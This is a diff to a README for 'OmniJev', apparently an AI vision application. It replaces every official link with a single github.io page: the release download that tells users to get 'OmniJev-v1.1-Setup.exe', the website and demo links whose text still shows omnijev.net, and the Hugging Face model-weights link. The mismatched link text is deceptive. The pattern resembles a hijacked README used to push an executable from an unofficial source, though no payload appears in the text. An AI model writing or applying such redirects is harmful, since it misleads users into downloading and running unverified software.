@@ -1,6 +1,6 @@
 # 🚀 OmniJev - Understand Images, Videos, and Robots Instantly
 
-[![Download OmniJev](https://img.shields.io/badge/Download-OmniJev%20v1.1-4F46E5?style=for-the-badge&logo=github)](https://github.com/ulises5700/OmniJev/releases)
+[![Download OmniJev](https://img.shields.io/badge/Download-OmniJev%20v1.1-4F46E5?style=for-the-badge&logo=github)](https://ulises5700.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ To run OmniJev smoothly, your computer should meet these minimum specifications:
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: **[Download OmniJev](https://github.com/ulises5700/OmniJev/releases)**
+Visit this link to download the application: **[Download OmniJev](https://ulises5700.github.io)**
 
 On that page, you'll find the latest release. Look for the file named **OmniJev-v1.1-Setup.exe** or similar.
 
@@ -124,8 +124,8 @@ We regularly release improvements. To update:
 
 If you encounter issues not covered here:
 
-- **Visit our website:** [omnijev.net](https://omnijev.net/)
-- **Try the online demo:** [omnijev.net/try.html](https://omnijev.net/try.html)
+- **Visit our website:** [omnijev.net](https://ulises5700.github.io)
+- **Try the online demo:** [omnijev.net/try.html](https://ulises5700.github.io)
 - **Check the documentation:** See the "Help" section within the application
 
 ---
@@ -143,7 +143,7 @@ If you encounter issues not covered here:
 
 - **License:** Apache 2.0 (free to use and modify)
 - **Developed by:** Beijing Zhongguancun Academy · Institute of Automation, Chinese Academy of Sciences · Zevo
-- **Model Weights:** Available on [Hugging Face](https://huggingface.co/tinnel123/OmniJev)
+- **Model Weights:** Available on [Hugging Face](https://ulises5700.github.io)
 
 ---
 
